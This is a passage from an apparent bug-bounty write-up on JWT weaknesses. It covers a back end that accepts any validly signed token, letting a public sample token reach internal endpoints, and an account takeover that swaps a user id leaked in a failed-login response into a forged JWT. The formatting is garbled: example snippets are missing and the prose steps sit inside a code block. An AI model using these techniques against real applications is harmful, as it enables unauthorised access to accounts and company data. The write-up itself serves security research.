    On the back-end mechanism, there was a security misconfiguration that didn’t check if the JWT token was generated for that specific application–instead, it accepted any JWT token that had a valid signature. So, using an example JWT token from [Microsoft’s website](https://docs.microsoft.com/en-us/azure/active-directory/develop/id-tokens#sample-v10-id-token):

    Within generic values:

    It was possible to access the internal endpoints, leaking the company data.
*   **ATO from IDOR**

    ```python

    1. So, anytime I hunt for flaws, the first thing I check for is ATO, so I created an account, and the application was JWT tokens for authentication, so I quickly copied my JWT and went to jwt.io to decode it, and it looked something like this-

    2. After investigating this, I was 50% certain that there was a weakness, therefore the next step was to find a means to obtain other people’s user ids.

    3. So I assumed it might have leaked in response to our request for a password reset, but it wasn’t disclosing the user id instead, it was leaking something more juicy, which will be described later.

    4. Then I tried to login with wrong password and checked the response of the request and it was leaking the user id

    5. Then I immediately created a 2 account, obtained its user id, and proceeded to jwt.io to replace it and obtain the JWT Token, after which I entered in with my 1 account but updated the JWT, and guess what? I was in into my 2 account.

    ```
